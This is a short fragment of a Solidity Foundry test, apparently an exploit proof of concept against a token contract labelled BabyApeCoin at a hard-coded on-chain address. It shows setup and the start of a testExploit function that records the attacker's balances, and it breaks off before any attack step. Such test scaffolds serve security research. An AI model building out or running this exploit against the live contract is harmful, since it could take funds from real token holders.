    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86;
    address attacker = address(this);
    IBabyApeCoin targetInstance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        targetInstance = IBabyApeCoin(TARGET);
        vm.label(TARGET, "BabyApeCoin");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalanceERC20 = IERC20(0xf8aA749821852bc54Ea5Dd84dd3842D28523fC86).balanceOf(address(this));
        // Record initial balance
        uint256 initialBalance = targetInstance.balanceOf(attacker);

        // Get the current owner
